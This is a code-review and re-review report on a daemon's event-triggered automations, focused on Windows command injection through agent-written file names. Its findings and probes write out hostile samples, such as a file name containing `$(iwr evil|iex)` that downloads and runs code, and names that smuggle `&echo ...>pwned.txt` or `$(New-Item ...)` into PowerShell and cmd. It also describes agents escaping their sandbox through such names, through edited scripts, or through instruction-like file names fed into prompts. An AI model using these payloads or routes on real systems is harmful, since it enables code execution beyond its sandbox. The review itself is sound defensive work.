# Code review: Phase 11, event-triggered automations

Worktree `D:\kelpie-par`, branch `phase11/event-automations` (base 6c635a1), uncommitted. This review only reports; no source was changed.
Date: 2026-10-25. Reviewer: code-reviewer.

## Scope
- Daemon: `crates/kelpied/src/automations.rs` (+`automations/tests.rs`), `daemon/automation.rs` (+`daemon/automation/tests.rs`), `daemon.rs`, `server.rs`, `auth.rs`, `session.rs`, `vt.rs`, `main.rs`, `kelpie-proto` (API 15).
- App: `app/src-tauri/src/watcher.rs`, `daemon_client.rs`, `app/src/lib/automation-events.ts`, `pull-requests.ts`, `finish.ts`, `components/settings/automation-settings.tsx`, `status-bar.tsx`, locales, docs.
- e2e: `scripts/e2e/event_automations.py`. I read it but did not run it: C: has 0.5 GB free and the WebDriver app build would not fit.
- About 1,230 lines added in tracked files, plus about 1,700 new lines (tests, `daemon/automation.rs`, e2e).

## What I checked myself
| Check | Result |
|---|---|
| `cargo test -p kelpied automation` | 31/31 pass |
| `cargo clippy -p kelpied --all-targets -- -D warnings` | clean |
| `pnpm typecheck`, `pnpm i18n:check` | clean, 0 missing |
| Scratch probe of Rust 1.97 `std::process::Command` on Windows | Calling a `.cmd` file directly is safe: the args `x&echo …>f`, `a"&echo …>f&"` and `%COMSPEC%` all arrived literally, no file was created, and `%COMSPEC%` came through unexpanded. **But** `powershell -NoProfile -Command Write-Output "$(New-Item pwned_ps.txt).md"` **created the file**, and `cmd /c echo %COMSPEC%.md` printed the expanded value. A bare `npm` or `show` (where only `show.cmd` exists) fails with "program not found", and `./show.cmd` was looked up in the **parent's** folder (`%TEMP%\show.cmd`), not in `current_dir`. |
| Old loader at 6c635a1 (`git show`) | `serde_json::from_slice::<Vec<_>>(v2 object)` fails, then `unwrap_or_default()` gives an empty list, and the next `save` writes over the v2 file. The developer's concern is real. |
| Phase 10 tree, read only | `API_LEVEL = 16` (`PHONE_V2_API = 14`, `RUN_HOST_API = 16`). Phase 11 using 15 fits that numbering. |

## Overall assessment
The core is solid. Auth denies by default. Approval is bound to a hash and re-checked when approving, so the command cannot change between display and approval. A damaged file is never overwritten. Migration writes a byte-exact `.bak`. The ticker no longer waits for runs. There are no new watcher roots. `refs/kelpie` cannot fire the commit trigger. The tests are real and mostly meaningful.

The main gap is on Windows. "No shell" holds only as long as the user does not choose an interpreter as the program. The daemon cannot find `npm`/`npx` (they are `.cmd` files), and a relative program is looked up in the daemon's working folder. Both push users toward `cmd /c …` or `powershell -Command …`, and with those an agent-controlled file name becomes code. Below that are several guard and storage holes, each Medium.

## Critical
None.

## High

### H1. On Windows the realistic setup turns event data back into code; nothing refuses it or warns
`crates/kelpied/src/daemon/automation.rs:418` (`Command::new(&plan.program)`), `crates/kelpied/src/automations.rs:261-289` (`validate`), `app/src/components/settings/automation-settings.tsx:215-223`, `docs/user-guide.md` ("nothing is parsed, expanded or interpolated").

- **Failure scenario (verified with a probe).**
  1. A user wants "on `**/*.md` change, run my lint script". `npm` cannot be found (Rust only appends `.exe` when it searches PATH), so they write program `powershell`, args `-Command`, `./lint.ps1`, `{file}`, and approve it.
  2. An agent, possibly a sandboxed Codex, writes `docs/$(iwr evil|iex).md`. `$`, `(`, `)` and `|` are legal in Windows file names.
  3. PowerShell joins everything after `-Command` into one script and runs the `$(…)` subexpression, outside the agent's sandbox.

  `cmd /c … {file}` is much safer, because Rust 1.97 quotes `&`, `^` and `"`. It still expands `%VAR%` inside the name, so the program sees different data than the file name. The UI text promises the opposite: "No shell is used … passed exactly as written".
- **Fix (in the daemon, not only the UI):**
  1. Resolve the program the way users expect. A path with a separator is joined onto `a.cwd`. A bare name is searched in `PATH` with `PATHEXT` (`.com;.exe;.bat;.cmd`), so `npm` becomes `npm.cmd`. Rust then quotes `.cmd` arguments safely (the probe shows this). Resolve at save time and include the resolved absolute path in `command_hash`, so the approval covers the file that will actually run.
  2. In `validate()`, refuse a placeholder argument (`{file}`, `{files}`, `{branch}`) when the program's file stem is an interpreter run with an "evaluate this text" flag. Cases: `cmd` + `/c` or `/k`; `powershell` or `pwsh` + `-c`, `-Command`, `-EncodedCommand`; `bash`, `sh`, `zsh` or `wsl` + `-c`; `node` + `-e`; `python` + `-c`. Point the user to `-File script.ps1 {file}` instead (with `-File`, PowerShell binds the remaining args as literal strings). If refusing is too strict, return a flag that the approval dialog shows in red.
  3. Add a unit test that spawns a real `.cmd` (and `powershell -File`) with a hostile name and checks the arguments arrive literally. Today's "real process" test runs the test `.exe`, so `pwned.txt` could never appear whatever the bug (see L10).

## Medium

### M1. Downgrade: an old daemon empties the list and overwrites the v2 file (the developer's concern 1 is real)
`crates/kelpied/src/automations.rs:689-700`, old loader at `6c635a1:automations.rs:118`.

- **Scenario.** The user installs an older build, which brings the old daemon (`load` → `unwrap_or_default()`). Settings shows "No automations yet". The user creates one, and `save` writes `[{…}]` over `{version:2,…}`. Every trigger, command, approval and pause is gone. The `.bak` holds only the pre-migration v1 list. On the next upgrade the new daemon migrates the one-item list, and the earlier `.bak` is kept, so the triggers do not come back.
- **Options, from smallest to strongest:**
  1. **Rolling copy (minimum, about 15 lines).** In `write()`, when the file on disk is a valid v2 file, copy it to `automations.json.v2` before `write_atomic` (or just write the same bytes to both). Old daemons never read that name. In `load()`, when `automations.json` is a v1 list (or missing) and `automations.json.v2` exists and parses, raise an inbox notice ("a newer automations list from <mtime> was kept as …"). Better still, merge by id: the v2 entries, plus any v1 entries with unknown ids.
  2. **Separate file.** Keep the v2 store in a new name (`automations-v2.json`), reset `automations.json` to `[]` after the `.bak` copy, and on each start import any non-empty v1 list by id, then reset it again. Old daemons can then neither misfire nor destroy anything.
  3. **Not viable: additive fields in the v1 list.** An old daemon treats trigger automations as daily-at-09:00 clock runs (the RT-13 "old-daemon misfire"). Its `Automation` struct has no `flatten` catch-all, so its first save drops `trigger` and `shell` anyway.
- Also add one sentence to the docs: after a downgrade the list looks empty until you upgrade again.

### M2. The "damaged file" notice can be lost, and after a restart the list is silently empty
`crates/kelpied/src/daemon/automation.rs:288-295`, `automations.rs:647-653`.

- `announce_automation_problem` checks `self.clients.lock().is_empty()`, but clients are registered on connect, before `auth` (`server.rs:55`). With the window closed, any connection takes the notice with `unannounced.take()`: an agent's `kelpied` hook report, `kelpied terminal list`, or a pre-auth probe. `broadcast` then goes to that connection and nobody sees it, unless phone push happens to be set up.
- The flag also lives only in memory. The file was renamed, so after any daemon restart (update hand-over, reboot) the daemon starts with no file and an empty, writable list, with no notice at all. That is the "silent empty list" RT-13 forbids.
- **Fix:**
  1. Gate on the app set (`!self.auto_rt.app.lock().is_empty()`), not on `clients`.
  2. In `load()`, when `automations.json` is missing but `automations.json.corrupt-*` siblings exist that have not been acknowledged, set `unannounced` (and `automation.state.error`) again. Mark them acknowledged with a small marker file, or by renaming to `.corrupt-<ts>.seen`, once the app has shown the notice.

### M3. The busy guard ignores `Waiting`, so a long turn can start a second copy of the same automation
`crates/kelpied/src/daemon/automation.rs:203`.

- `automation_busy` treats a session as busy only when `Status::Working`.
- **Scenario.** Automation A starts an agent on `spec.md` change. 70 s into the turn (past the 60 s gap) the agent edits `spec.md` and asks for permission, so the status is `Waiting`. The watcher batch arrives about 150 ms later, A is not busy, and a second agent starts on the same files while the first waits.
- The commit trigger has the same hole: a 10 s poll that lands while the agent waits after a `git commit` fires A again.
- **Fix:** count `Working | Waiting` (alive and not idle) as busy. Optionally refresh `quiet_until` on every Working→Waiting change, the same way the turn-end path does.

### M4. Commit detection can lose commits and invent them
`crates/kelpied/src/daemon/automation.rs:219-223, 252-262`, `automations.rs:898-901`.

- **Lost commits.** `automation_turn_started` observes HEAD with `fire=false`, *after* `checkpoint_turn_start` in the same `spawn_blocking` closure (`daemon.rs`). A snapshot of a large repo takes seconds. Two cases:
  - An agent asked to "commit this" commits during that window. The turn-start probe takes the new HEAD as the baseline and the commit never fires.
  - The same probe swallows a hand commit made up to 10 s before any agent turn starts.
- **Invented commits.** In detached-HEAD state the "branch" is always `"HEAD"`, so `git checkout <sha>` or every `git bisect` step counts as "a commit on the same branch".
- **Fix:**
  - Key `Heads` by the automation's root, or by the worktree top. Probe at turn start or end only for commit roots that contain the session's folder, always with `fire=true`. The poll keeps the baseline, so the turn-start probe can go. This also stops spawning git for every turn of every session in unrelated folders (see L2).
  - In `observe`, ignore moves where `branch == "HEAD"`.

### M5. A quick action types into the user's own session, half-typed text included
`crates/kelpied/src/daemon/automation.rs:393-411`, `session.rs` `type_when_idle`.

- `type_into_idle` picks any live terminal session of that agent kind under `a.cwd`, including one the user is working in. `type_when_idle` checks only `Status::Idle`. It does not check that nothing was typed recently, unlike `continue_if_limited`.
- **Scenario.** The user has typed `fix the login bu` into Claude's prompt without pressing Enter. A file event pastes the saved prompt after it, and the separate Enter 250 ms later (`input_if_last_typed_at` passes, because the paste was the last write) submits the user's fragment plus the automation's prompt.
- `adopt_session` then marks the user's session as the automation's, so the automation stays muted whenever the user works there.
- **Fix:**
  - Refuse when `activity.last_typed` is within about 30 s, and when the screen's input line is not empty (`screen_prompt()` exists).
  - Prefer sessions this automation started (`busy.sessions`). Otherwise start a new session rather than borrow the user's.

### M6. An agent or quick action with `kind: "shell"` or `"custom"` is an unapproved shell command
`crates/kelpied/src/automations.rs:273-279`, `daemon/automation.rs:126-129`, `agents.rs:421-427`.

- `validate()` accepts any `kind` for `Agent` and `Quick`. For `shell` and `custom`, `build_launch` types the prompt "as plain keys" at startup.
- `event_prompt` appends `- <file name>` lines, so a file named `$(…)` is typed into a shell and run. The quick path does the same through a bracketed paste followed by Enter.
- The app gate looks only at `action == Shell || shell.is_some()`, so a plain-token script (no `client:"app"`) can save this. The UI cannot (`launchableAgents` lists agent presets only), so it is defence in depth. It still breaks the spec rule that shell actions are app-only, approved, and never interpolate event data.
- **Fix:** in `validate()`, refuse `Agent` and `Quick` unless `kind` is an agent preset (`agents::preset_for(kind).is_some()`) and not `shell`/`custom`.

### M7. Leftover child processes keep an automation "running" for ever
`crates/kelpied/src/daemon/automation.rs:427-448`.

- `child.kill()` on timeout ends only the direct child. `keep_end` reader threads hold the inherited stdout/stderr pipes until **every** process holding them exits, and the waiting thread `join`s them before `finish_shell`.
- **Scenario:** `cmd /c npm test`, where node or a watcher outlives cmd, or any tool that leaves a background server with inherited handles (Gradle daemon, `dev` servers).
  - `finish_shell` never runs, `running` keeps the id, and the automation is "busy" until the daemon restarts.
  - The run is never recorded, and the 5-minute limit does not help.
- **Fix:** start the child in a Job Object with kill-on-close on Windows (the crate already has `cpu_job`/`proc_tree`) or a process group on Unix, and kill the tree on timeout. Join the reader threads with a deadline after the main child exits.

### M8. A relative program runs from the daemon's folder, not the automation's
`crates/kelpied/src/daemon/automation.rs:418-419`. Verified by probe: `./show.cmd` with `current_dir(work)` ran `%TEMP%\show.cmd`.

- The approval dialog says "In the folder <cwd>", but `./scripts/check.cmd` resolves against wherever the app started `kelpied`. That folder is inherited and unpredictable (the install folder, `System32` for autostart, a dev shell's folder).
- Usually this gives "not found". Worse, it can run a different file than the user approved.
- **Fix:** see H1, step 1. Join relative programs onto `a.cwd`, or refuse them, and hash the resolved path.

### M9. The `client:"app"` claim is self-declared; the docs overstate it
`crates/kelpied/src/server.rs:156`, `docs/architecture.md:806-809` ("set by the window's connection and by no script").

- Any process holding the user token can send `{"token":…, "client":"app"}`, including a non-sandboxed agent that reads `<data>/Kelpie/auth/<endpoint>.token`. It then gets command save, approve and `automation.event`.
- This adds nothing beyond what the user token already allows (for example `session.create`), and the threat model says so (`architecture.md:73`). But the spec asks for a capability, and the docs present it as a boundary.
- **Fix:** word the docs as a convention ("scripts that use the user token do not claim it; it is not a boundary against same-user code"). If a real boundary is wanted later, give the window a per-launch secret over Tauri IPC.

### M10. Automations can still loop through each other (documented, but the success criterion says "without loops")
`crates/kelpied/src/daemon/automation.rs:195-216`.

- Busy tracking is per automation.
- **Example:** "spec changed → ask Gemini to update tasks" plus "tasks changed → ask Claude to update spec" ping-pong, once a minute each, until both daily caps (10 by default) are used up. The user guide admits this.
- **Fix (cheap):** while any automation-started session is alive and not idle in a folder, ignore file and commit events from inside that folder for **every** automation, not only its owner. Or add a per-project budget across automations.

### M11. The "Dry run" checkbox appears for old daemons, which then run the automation for real
`app/src/components/settings/automation-settings.tsx:224`.

- Triggers, quick and command actions are disabled below API 15, but the dry-run checkbox is not.
- An API-13 daemon ignores `dry_run`, so a "dry" scheduled agent really starts at 09:00.
- **Fix:** `disabled={!events()}` on the checkbox (or hide it), like the other new options.

## Low
- **L1. Commit poll threads can pile up.** `daemon/automation.rs:273-284`: `poll_commits` starts a new thread every 10 s with no "already polling" guard, and `checkpoints::git` has no timeout. A repo on a network share that went offline, or a git process stuck behind antivirus, leaves one more blocked thread every 10 s. Add an `AtomicBool` guard.
- **L2. Git runs for unrelated sessions.** `daemon/automation.rs:219-244`: once any commit automation exists, every non-shell session's turn start and end runs `git rev-parse`, even in folders no commit automation covers. Filter by `commit_roots()` (this falls out of the M4 fix).
- **L3. File names starting with `@` are passed as-is.** `automations.rs:538-541`: `arg_safe` neutralises a leading `-` only. gcc, clang, javac, MSBuild and dotnet read options from a file when an argument starts with `@` (a response file). Prefix `./` for `@` too, and for `+`, which some editors and tools treat as a command.
- **L4. Batch scripts that use `%KELPIE_FILE%` can still be injected.** `docs/user-guide.md`: a `.cmd` that does `echo %KELPIE_FILE%` re-parses the value (a file named `a&calc.md` runs calc). Add a line to the docs: quote it (`"%KELPIE_FILE%"`) or use `!VAR!` with delayed expansion. No `rust-version` is pinned, and the safe `.cmd` argument quoting needs std 1.77.2 or newer. Add `rust-version = "1.77.2"` (or later) to `crates/kelpied/Cargo.toml`.
- **L5. PR polling details.** `automation-events.ts:60-68`, `pull-requests.ts:25-32`:
  - Two PR automations on one project refresh it twice. Deduplicate by project id.
  - `reportedFailing` lives in memory, so every app restart reports a still-failing PR again. The gap and cap limit this.
  - A PR that goes failing → failing across a push, with no "pending" seen in between, is not reported.
  - Auth, rate and offline behaviour are fine: it uses `gh`'s own auth, about 12 calls per hour per project, and errors are swallowed.
- **L6. The approval hash leaves out the trigger.** `automations.rs:241-251`: an approved command moved from "worktree finished" to "any file `**`" keeps its approval. This is acceptable because only the app can edit it, but consider hashing `trigger.event` so the approval dialog's "whenever X fires" stays true.
- **L7. File names reach agent prompts as plain text.** `automations.rs:571-589`: a file named like an instruction is pasted into an agent prompt, and the agent may run with yolo arguments. The developer noted this. Put the names in a fenced block labelled as untrusted data.
- **L8. A temporary read error turns automations off until restart.** `automations.rs:634-637`: a Windows sharing violation at startup (Defender, OneDrive) clears the list and refuses writes for the daemon's whole life. Retry a few times before giving up.
- **L9. Phase label in the e2e script.** `scripts/e2e/event_automations.py:69,135,140`: environment variables `P11_LAUNCHES` and `P11_RECORDS` carry a phase number. The project rule says no plan or phase IDs in code or tests; rename them, for example to `EVENT_AUTO_LAUNCHES`.
- **L10. One test cannot catch the bug it is written for.** `daemon/automation/tests.rs:160-185`: the "hostile name" real-process test runs the test `.exe`, where no shell is involved, so asserting that `pwned.txt` is absent proves nothing about shells. Covered by H1, step 3.
- **L11. API numbering across branches.** `automation-events.ts:10`: `AUTOMATION_API = 15` with phase 10 at 14 and 16 is consistent, but a daemon built from the phase-10 tree alone (API 16) would pass the app's `>= 15` check without having automations. Merge both before any release that reports 16.
- **L12. Pattern matching differs by platform and has a gap for nested roots.** `automations.rs:374-376`:
  - Case-insensitive matching is Windows-only, while macOS file systems are usually case-insensitive too.
  - `[abc]` classes are taken literally. Document both.
  - When a watched root sits inside an automation's folder, its file paths are relative to that root while the pattern is relative to the automation's folder. Path patterns (`docs/*.md`) then miss; name-only patterns still work.
- **L13. Pause does not stop a command already running.** That matches the text ("nothing starts by itself"), but the status-bar tooltip could say so.

## Edge cases from scouting
- **Pause.** It stops clock runs (`due()` skips and reschedules), events (`on_event` returns early) and PR polling (the window checks `state().paused`). Commit baselines keep updating while paused, so commits made meanwhile are not replayed. Runs already started, and a quick action's pending Enter, finish.
- **Approval.** The command cannot change between display and approval (`approve` compares the current hash). An editor's copy of `approved_hash` is ignored, and any change to folder, program or arguments drops it. Firing uses the snapshot taken under the lock, and `start_shell` checks `approved()` again.
- **Auth.** Session, claimed and anonymous callers never reach `automation.*` (default deny in `allowed`). Unit tests cover 14 param shapes. A re-auth clears the app mark, and so does a disconnect (`drop_client`).
- **Locks.** No deadlock found. The order is `automations → busy → sessions(read) → session.inner`, and nothing takes `automations` under a session lock.
- **The 60 s gap.** It protects against an automation's own commit or file loop when a command ends within 55 s of firing. Past that, the 5 s quiet window and the 10 s poll can line up, which M3 and M4 tighten.

## What these results show about risk
These are the claims I checked; the tests behind them are meaningful:
- A damaged file is never overwritten, on every write path.
- Migration keeps `deliver`, `args`, `env` and `next_run`, and leaves a byte-exact `.bak`.
- `refs/kelpie` checkpoints do not fire the commit trigger (tested against real git).
- The ticker spawns runs and does not wait for them.
- The watcher reuses its existing batch, so there are no new roots.
- On Rust 1.97, calling a `.cmd` file directly is not open to the BatBadBut bug (probe).

## Recommended actions, in order
1. H1 and M8: resolve the program (PATHEXT, relative to the automation folder), hash the resolved path, refuse placeholders after interpreter eval flags, and add a real `.cmd` / PowerShell test.
2. M6: in `validate()`, allow only agent presets for agent and quick actions.
3. M3 and M4: count `Waiting` as busy; key heads by commit root and fire at turn probes; ignore detached HEAD.
4. M5: refuse to type into sessions with recent or pending user input; prefer the automation's own sessions.
5. M1 and M2: keep a rolling `automations.json.v2` copy and notice; announce only to the app; re-announce `.corrupt-*` files after a restart.
6. M7: kill the whole process tree (job object) and join readers with a deadline.
7. M11, M9, M10: gate the checkbox, fix the docs wording, add a cross-automation guard.
8. The Low items, as convenient.

## Plan follow-ups (no plan edits made)
- All 5 implementation steps are present. Unit tests are present. The e2e exists (69/69 by the developer's runs; I did not run it). Static checks pass.
- Perf gate: matching was measured only in a debug build (0.44 ms best). A release-build measurement is still needed for the "≤ 1 ms" gate.
- Success criterion: "works without loops or injection" is **not yet met** on Windows (H1) and across automations (M10).
- `github.rs` was not modified, unlike the spec's file list. That is justified: PR state lives in `pull-requests.ts`.

## Unresolved questions
- Should H1 refuse interpreter eval flags combined with placeholders outright, or only warn in the approval dialog? Refusing is safer; warning gives more freedom. This is a product decision.
- Is downgrading a supported path? If yes, use M1 option 2. If not, option 1 (rolling copy plus notice) is enough.

Status (first round): DONE_WITH_CONCERNS. It is replaced by the Re-review status at the end of this report.

---

## Re-review (2026-10-25, current `D:\kelpie-par` tree)

Scope: the developer's "Review round" section, the current `automations.rs` (1,328 lines), `daemon/automation.rs`, the `proc_tree.rs` export, `session.rs` `type_when_idle`, `Cargo.toml`, the settings UI, and the tests. Report only: no source was changed.

### What I ran
| Check | Result |
|---|---|
| `cargo test -p kelpied automation` | **48/48 pass**, including the real `.cmd`/`.ps1` test and the job-object test |
| `cargo clippy -p kelpied --all-targets -- -D warnings` | clean |
| `pnpm typecheck` / `pnpm i18n:check` | clean / 1901 keys, 0 missing |
| Probe: `npm.cmd run lint <hostile names>` (offline, update check off) | Literal: `&`, `%PATH%`, `$(…)`, `^&` and `!PATH!` all reached the script unchanged. The developer listing `npm.cmd run lint {file}` as safe is **correct**. |
| Probe: `powershell -File ./lint.ps1 "$(New-Item …).md"` | Literal, nothing created |
| Probe: `pwsh ./lint.ps1 "$(New-Item …).md"` (no flag) | Literal (pwsh assumes `-File`) |
| Probe: **`powershell -NoProfile -ExecutionPolicy Bypass ./lint.ps1 "$(New-Item …).md"`** (no flag) | **File created: the name ran as code** |
| Probe: **`cmd /c echo %KELPIE_FILE%`** with `KELPIE_FILE=docs/a&echo INJECTED>pwned.txt&.md` | **pwned.txt created: the name ran as code** |
| e2e `event_automations.py` | Not run by me: it needs the WebDriver app build. The developer reports 83/83 twice. |

### Status of each item from the first round

| Item | Status | Evidence |
|---|---|---|
| H1 resolution: bare names searched on PATH with PATHEXT, paths with a separator taken relative to the automation's folder | **Fixed** | `automations.rs:593-634`. Only `.com/.exe/.bat/.cmd` are runnable, so `.ps1` is never started directly. |
| H1 hash covers the resolved program and every argument | **Fixed** | `automations.rs:259-282` covers trigger event, folder, resolved absolute path (or `unresolved:<name>`) and each argument. If the program moves on PATH or a different file appears, the hash changes and the automation stops as not approved (the safe direction, tested in `what_starts_a_command_is_part_of_what_was_approved`). |
| H1 refusal list | **Fixed for the forms tested, still open for two common Windows forms; see B1 and B2** | `automations.rs:637-724` |
| H1 real `.cmd`/`.ps1` tests | **Fixed** | `daemon/automation/tests.rs:508-526`. A real relative `.\show.cmd` and `powershell -File show.ps1` receive a name containing `$( )`, backticks, `&`, `^` and `%PATH%` literally, in argv and in `KELPIE_FILE`. |
| H1 can a file in the repo take over a bare name (a planted `git.cmd`)? | **No** | `resolve_program_in` searches only the folders on `PATH`, never the automation folder or the daemon's folder. A relative PATH entry (`.`) is taken relative to the daemon's own working folder, not the project. Changing which file a path points to (adding `lint.com` next to an approved `lint.cmd`) changes the hash, so it stops instead of running. **Remaining:** see N1, the approved file's *contents* can be changed. |
| M1 `.v2` copy and Restore/Keep | **Fixed** | Each save writes the same bytes to `automations.json.v2` (`automations.rs:1015-1022`). An old-format main file plus a non-empty `.v2` means nothing is written, a notice is shown, and the user chooses (`automations.rs:863-870`). Restore merges by id, the newer list first (`automations.rs:950-963`). Keep sets `.v2` aside. Tested. |
| M2 damaged-file notice | **Fixed** | Announced only when an app connection exists (`daemon/automation.rs` `announce_automation_problem`). An unacknowledged `.corrupt-*` file keeps writes refused after restarts (`automations.rs:850-855`). `automation.resolve` is app-only, sessions are denied by default, and it is in the test's method list. |
| M3 busy guard | **Fixed** | `daemon/automation.rs` `automation_busy` counts a session as busy when it is alive and `Working` or `Waiting`. Tested. |
| M4 commit detection | **Fixed** (two small leftovers, see N5) | The turn-start probe is gone. The turn-end probe looks only at commit roots that contain the session's folder, with the same key as the poll. A move while HEAD is detached is ignored (`automations.rs:1258`). |
| M5 quick action | **Fixed** | `type_into_own` types only into sessions this automation adopted. `type_when_idle` refuses unless the session is `Idle` with nothing typed in the last 30 s (`session.rs:593-602`). The user's own session is never chosen. |
| M6 shell-kind agents | **Fixed** (a small UI leftover, see N7) | `kind` must be a known agent or `shell`/`custom`. Those two count as commands: app-only save, a hash over kind, args and prompt, no event data in what is typed, and a quick action of that kind is refused. |
| M7 process tree | **Fixed** (see N4) | Job object with kill-on-close (process group on Unix). The whole tree is killed on timeout and when the command ends, and the output readers get a 3 s grace. Tested with cmd plus a ping grandchild. |
| M8 relative program | **Fixed** | Same as the resolution item above. |
| M9 docs | **Fixed** | |
| M10 chain limit | **Fixed** (it depends on timing, see N6) | `MAX_CHAIN = 3`. An automation's chain length is the longest among the busy automations near its folder, plus one. |
| M11 Dry run checkbox | **Fixed** | `automation-settings.tsx:227` has `disabled={!events()}`. |
| L1-L10, L12 | Fixed as described | `rust-version = "1.82"` is real (the code uses `is_none_or`). The `P11_*` names are gone. PR reports are kept in localStorage. |
| L11, L13 | Not done (deferred as agreed) | |

### Still blocking

**B1. Windows PowerShell 5.1 with a script but no `-File` runs the event data as code.** `automations.rs:667-681, 697-709`.
- `powershell.exe` treats everything after its own switches as `-Command` when no `-File` is given; `pwsh` assumes `-File`.
- `code_risk` only looks for an explicit `-Command`, `-EncodedCommand` or `-c` flag. So `powershell ./lint.ps1 {file}`, or `powershell -NoProfile -ExecutionPolicy Bypass lint.ps1 {file}`, passes the check. Both are the most natural way to write it on Windows.
- My probe of that exact form created the file named inside `$(…)`. This defeats the controller's refusal rule for its main target.
- None of the "allowed" test cases cover it (`automations/tests.rs:591-606`).
- **Fix:** for `powershell`/`powershell_ise` (not `pwsh`), the first argument that is not a switch must be `-File` (or an abbreviation of it). If it is anything else and an event placeholder comes later, refuse with the same message. Remember that `-ExecutionPolicy`, `-WindowStyle`, `-Version`, `-InputFormat`, `-OutputFormat` and `-ConfigurationName` each take a value. Add `("powershell", &["./lint.ps1", "{file}"])` and `("powershell", &["-NoProfile", "-ExecutionPolicy", "Bypass", "lint.ps1", "{file}"])` to the refused tests.

**B2. `cmd` with `%KELPIE_…%` in its arguments runs the event data as code, with no placeholder at all.** `automations.rs:687-695`.
- `code_risk` returns `None` as soon as there is no `{file}`-style placeholder (`position(is_placeholder)?`).
- cmd expands `%KELPIE_FILE%` on its command line *before* it parses `&`, `|` and `>`. My probe with `cmd /c echo %KELPIE_FILE%` and a name containing `&echo INJECTED>pwned.txt&` created the file.
- This is the exact step the refusal message and the UI push users toward: "a script reads … the KELPIE_FILE variable", and "the same data is in KELPIE_* environment variables".
- Calling a `.cmd`/`.bat` directly is not affected: Rust passes a `%…%` argument to it literally.
- **Fix:** when the program is `cmd` (directly or behind a wrapper), refuse any argument that contains `%` or `!` (or at least `%KELPIE_` / `!KELPIE_`). Point the user to calling the `.cmd` file directly with `{file}`, which is literal (the developer's own test proves it). Add a refused test case for it.

**B3. `ssh` is a remote command line, the same class as `wsl`.** `automations.rs:637-655, 693`.
- `ssh host ./lint.sh {file}` joins the arguments and the remote shell parses them, so `$(…)` runs on the remote machine. Kelpie users have saved SSH hosts, so this is a natural command to write.
- `ssh` is in neither the interpreter nor the wrapper list.
- **Fix (one line):** treat `ssh` (and `plink`) like `cmd`/`wsl`: any placeholder is refused. While there, also cover `su -c`, `watch` (it runs its arguments through `sh -c`), `script -c`, `runas`, `conhost`, `wt`, and `forfiles /c`.

### New, not blocking

- **N1 (Medium). An approved script inside the project can be rewritten by an agent.**
  - The hash binds the *path* of `./scripts/lint.cmd`, and of `scripts/update.py` given to `python`, not their contents.
  - A sandboxed agent (for example Codex in workspace-write mode) can edit that file, and the next event runs the edit outside the sandbox with no new approval.
  - This is inherent to "run my repo script when files change" (git hooks behave the same way). But the approval dialog shows only the command text and the folder.
  - **Fix:** in the approval dialog, say that "this program/script is inside the project; changes to it are not re-approved". Optionally, include the contents' SHA-256 in the hash when the resolved program, or an argument naming an existing file, is inside `a.cwd`.
- **N2 (Medium). Program lookup runs under the automations lock and can stall the ticker.**
  - `approved()` and `command_hash()` call `resolve_program`: a stat on every PATH folder × 4 extensions. That happens inside `on_event_chained`, while holding `self.automations`, for each automation about to fire, and in `shown()` for every `automation.list`.
  - A PATH entry on a disconnected network share makes each stat take seconds. The ticker's `due()` waits for the same lock (the RT-13 "ticker stalls" risk).
  - **Fix:** resolve once at save/approve time and store the resolved path in the automation. Check the hash off the lock (copy the automation out, check, then fire), or cache the lookup per program.
- **N3 (Low). The approval dialog does not show what will actually run.**
  - `automation-settings.tsx` `approve` shows `commandText(a)` (`npm …`), but the hash binds `C:\Program Files\nodejs\npm.cmd`. Show the resolved path. `shown()` can return it beside `command_hash`.
  - When the program cannot be found, the user is offered approval of an `unresolved:` hash. That is safe (finding the program later changes the hash), but the dialog should say "not found".
- **N4 (Low). Killing the whole tree on a normal exit also kills apps the command opened.**
  - With `code {file}`, if VS Code was not already running, `Code.exe` lives in the job and is killed when `code.cmd` returns.
  - Separately, the job is assigned after `spawn` returns, so a grandchild started in those first milliseconds escapes it (the `proc_tree.rs` comment already admits this). Start suspended, or document it.
  - Suggest killing only on timeout, and on a normal exit just stopping the wait for readers after the grace period. Or document the current behaviour.
- **N5 (Low). Commit detection leftovers.**
  - `watch_head` (on every `automation.save` of a commit automation, even an enable toggle) records HEAD without firing, so a commit made since the last poll (≤ 10 s) is swallowed.
  - The poll thread and a turn-end probe of the same root can record HEAD out of order: a stale read is taken as a "move" and fires a spurious commit event. The 60 s gap limits the damage.
  - Fix: hold a per-root lock across `head_of` and `observe`, and baseline only when the root has no entry yet.
- **N6 (Low). The chain limit depends on timing.** Depth is taken only from automations busy at the moment of the event. A link that passes through a quiet moment resets the chain to 0. Example: a commit seen by the 10 s poll after the agent's 5 s quiet window has ended. Ping-pong through commits is then limited only by the gap and the daily caps. Acceptable, but say so in the docs.
- **N7 (Low). Shell-kind agents: an empty approval dialog, and env not hashed.**
  - For a typed-shell automation, `commandText` reads `a.shell`, which is empty for kind `shell`/`custom`, so the approval dialog shows a blank command. The UI cannot create these; only an app-claiming API client can.
  - `a.env` is not in that hash, and env like `BASH_ENV`, `ENV` or `PROMPT_COMMAND` changes what runs.
  - Fix: show `kind args… / prompt`, and hash `env` for typed shells.
- **N8 (Low). The wrapper loop gives up open after 4 levels.** `code_risk`'s `for _ in 0..4` ends in `None`, so `env env env env bash -c {file}` is allowed. Return a refusal when the loop runs out. Also add the common runners to `WRAPPERS` (`npx`, `pnpm`/`yarn`/`bunx` `exec`/`dlx`, `uv run`/`uvx`, `poetry run`, `pipx run`, `cross-env`, `conda run`) so `npx bash -c {file}` is caught. And `php -B/-R/-E` is missed (only `-r` is checked).
- **N9 (Low). While a restore is pending, the old list still runs.** `due()` does not check `broken`. While Restore/Keep is pending, the older list's clock automations still run, and their reschedules are not saved. Either gate `due()` on `broken`, or say "the current (older) list keeps running" in the notice.
- **N10 (Low). `head_of` dropped the hardened git options.** It now calls `git` directly instead of `checkpoints::git`, losing `-c core.fsmonitor=false` and the hooks-off option. `rev-parse` does not run fsmonitor today, but keep the same hardening for consistency.

### Plan follow-ups
All first-round items except B1-B3 are verified fixed in code and by tests. The perf gate still has only a debug-build matching number. The success criterion "without loops or injection" holds once B1-B3 are fixed. Loops are bounded by the chain limit plus caps, with the timing caveat in N6.

Status (re-review round): DONE_WITH_CONCERNS. It is replaced by the Final check status below.
Summary (re-review round): H1's resolution, hash, real-script tests and every Medium fix are verified (48/48 tests, clippy clean, probes confirm `.cmd` and `npm run` receive names literally). Three items still block the High: `powershell` without `-File` and `cmd /c … %KELPIE_FILE%` both run agent-written file names as code (verified by probe), and `ssh` is missing from the remote-shell refusal class. The rest are non-blocking Medium/Low notes (approved repo scripts can be edited by agents, PATH lookup held under the automations lock, dialog wording).

---

